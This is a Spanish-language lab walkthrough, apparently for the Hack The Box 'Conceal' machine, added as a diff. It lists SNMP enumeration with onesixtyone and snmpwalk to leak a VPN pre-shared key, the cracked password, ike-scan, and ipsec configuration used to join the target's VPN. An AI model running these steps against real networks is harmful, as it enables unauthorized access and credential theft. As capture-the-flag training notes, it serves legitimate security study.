@@ -1,0 +1,72 @@
+{MAQUINA Conceal}
+
+1.Onesixtyone 10.10.10.116 -> (Para saber si la llave que usa es privada o publica)
+	Ejemplo -> 10.10.10.116 [public] Hardware: AMD64 Family 23 Model 1 Stepping 2 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)
+
+
+2.Hacemos fuerza bruta a la llave para intentar tener informacion de ella
+	snmpwalk -c public -v2c 10.10.10.116
+	(En el caso de que fuese un sistema que se consiguiese hacer fuerza bruta obtendriamos tokens) Ejemplo -> (iso.3.6.1.2.1.1.4.0 = STRING: "IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43" iso.3.6.1.2.1.1.5.0 = STRING: "Conceal")
+
+3.Ya que tenemos la password NTLM que es 9C8B1A372B1878851BE2C097031B6E43 -> Dudecake1!
+
+4.Escaneo del protocolo de IKE (Protocolo VPN)
+
+	Usamos ikeScanner
+		Terminal -> ike-scan 10.10.10.116 -M | tee output
+
+	
+5.Editamos ficheros de ipsec para la configuracion de conexion a la VPN victima
+
+[*]Nos metemeos en el archivo ipsec.secrets y ponemos lo siguiente
+	Terminal -> %any : PSK "Dudecake1!" (Esto lo hacemos para autenticarnos con la clave ya extraida que es una llave PSK)
+
+	Ponemos este codigo para ver si nos pudiesemos meter(todo lo rellenado a sido debido a la informacion que hemos recogido de la vpn)
+
+Code ->	
+		conn conceal
+			ike=3des-sha1-modp1024
+			esp=3des-sha1
+			auto=add # ondemand start
+			authby=secret
+			type=transport
+			keyexchange=ikev1
+			left=10.10.14.10
+			right=10.10.10.116
+
+[*]Ahora antes de ver si pudiesemos conenctarnos a la VPN necesitamos reiniciar el sistema de ipsec
+
+	Terminal -> ipsec restart
+
+[*]Despues necesitamos levantar la directiva conceal
+	Terminal -> ipsec up conceal
+
+[-] Ahora nos sale un error de que se ha tenido una conexion establecida de conceal fallida
+	Fallo -> establishing connection 'conceal' failed
+
+
+[*] Le integramos al codigo de /etc/ipsec.conf el codigo de rightsubnet=10.10.10.116[tcp] lo hacemos para forzar una conexion tcp con la vpn
+
+	Code -> 
+		conn conceal
+			ike=3des-sha1-modp1024
+			esp=3des-sha1
+			auto=add # ondemand start
+			authby=secret
+			type=transport
+			keyexchange=ikev1
+			left=10.10.14.10
+			right=10.10.10.116
+			rightsubnet=10.10.10.116[tcp]
+
+[*] Reiniciamos el programa de ipsec y subimos el conceal
+	Terminal -> ipsec.restart
+
+[*] Subimos ahora el conceal para ver si tenemos conexion
+	Terminal -> ipsec up conceal
+
+[+] Ahora nos da que hemos entablado conexion
+
+[*] Ahora podemos hacer una traza tcp con nmap como siempre que ya nos mostrara los puertos tcp
+
+Y YA PODRIAMOS VER SI LOS PUERTOS EXPUESTOS SON VULNERABLES
